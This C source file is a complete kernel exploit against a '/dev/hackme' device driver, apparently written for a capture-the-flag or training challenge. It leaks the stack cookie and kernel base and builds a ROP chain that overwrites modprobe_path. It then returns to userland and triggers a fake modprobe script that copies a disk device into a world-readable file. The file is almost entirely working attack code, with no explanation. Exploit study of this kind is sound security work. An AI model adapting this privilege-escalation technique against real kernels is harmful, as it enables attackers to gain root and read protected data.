#define _GNU_SOURCE
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <linux/userfaultfd.h>
#include <sys/wait.h>
#include <poll.h>
#include <unistd.h>
#include <stdlib.h>


int global_fd;

void open_dev(){
    global_fd = open("/dev/hackme", O_RDWR);
	if (global_fd < 0){
		puts("[!] Failed to open device");
		exit(-1);
	} else {
        puts("[*] Opened device");
    }
}

unsigned long user_cs, user_ss, user_rflags, user_sp;

void save_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    puts("[*] Saved state");
}

void print_leak(unsigned long *leak, unsigned n) {
    for (unsigned i = 0; i < n; ++i) {
        printf("%u: %lx\n", i, leak[i]);
    }
}

unsigned long cookie;
unsigned long image_base;
unsigned long kpti_trampoline;
unsigned long pop_rax_ret; // pop rax; ret;
unsigned long pop_rbx_r12_rbp_ret; // pop rbx ; pop r12 ; pop rbp ; ret;
unsigned long write_ptr_rbx_rax_pop2_ret; // mov qword ptr [rbx], rax; pop rbx; pop rbp; ret;
unsigned long modprobe_path;

void leak(void){
    unsigned n = 40;
    unsigned long leak[n];
    ssize_t r = read(global_fd, leak, sizeof(leak));
    cookie = leak[16];
    image_base = leak[38] - 0xa157ULL;
    kpti_trampoline = image_base + 0x200f10UL + 22UL;
    pop_rax_ret = image_base + 0x4d11UL;
    pop_rbx_r12_rbp_ret = image_base + 0x3190UL;
    write_ptr_rbx_rax_pop2_ret = image_base + 0x306dUL;
    modprobe_path = image_base + 0x1061820UL;

    printf("[*] Leaked %zd bytes\n", r);
    //print_leak(leak, n);
    printf("    --> Cookie: %lx\n", cookie);
    printf("    --> Image base: %lx\n", image_base);
}

void get_flag(void){
    puts("[*] Returned to userland, setting up for fake modprobe");
    
    system("echo '#!/bin/sh\ncp /dev/sda /tmp/flag\nchmod 777 /tmp/flag' > /tmp/x");
    system("chmod +x /tmp/x");

    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
    system("chmod +x /tmp/dummy");

    puts("[*] Run unknown file");
    system("/tmp/dummy");

    puts("[*] Hopefully flag is readable");
    system("cat /tmp/flag");

    exit(0);
}

void overflow(void){
    unsigned n = 50;
    unsigned long payload[n];
    unsigned off = 16;
    payload[off++] = cookie;
    payload[off++] = 0x0; // rbx
    payload[off++] = 0x0; // r12
    payload[off++] = 0x0; // rbp
    payload[off++] = pop_rax_ret; // return address
    payload[off++] = 0x782f706d742f; // rax <- "/tmp/x"
    payload[off++] = pop_rbx_r12_rbp_ret;
    payload[off++] = modprobe_path; // rbx <- modprobe_path
    payload[off++] = 0x0; // dummy r12
    payload[off++] = 0x0; // dummy rbp
    payload[off++] = write_ptr_rbx_rax_pop2_ret; // modprobe_path <- "/tmp/x"
    payload[off++] = 0x0; // dummy rbx
    payload[off++] = 0x0; // dummy rbp
    payload[off++] = kpti_trampoline; // swapgs_restore_regs_and_return_to_usermode + 22
    payload[off++] = 0x0; // dummy rax
    payload[off++] = 0x0; // dummy rdi
    payload[off++] = (unsigned long)get_flag;
    payload[off++] = user_cs;
    payload[off++] = user_rflags;
    payload[off++] = user_sp;
    payload[off++] = user_ss;

    puts("[*] Prepared payload to overwrite modprobe_path");
    ssize_t w = write(global_fd, payload, sizeof(payload));

    puts("[!] Should never be reached");
}

int main() {

    save_state();

    open_dev();

    leak();

    overflow();
    
    puts("[!] Should never be reached");

    return 0;
}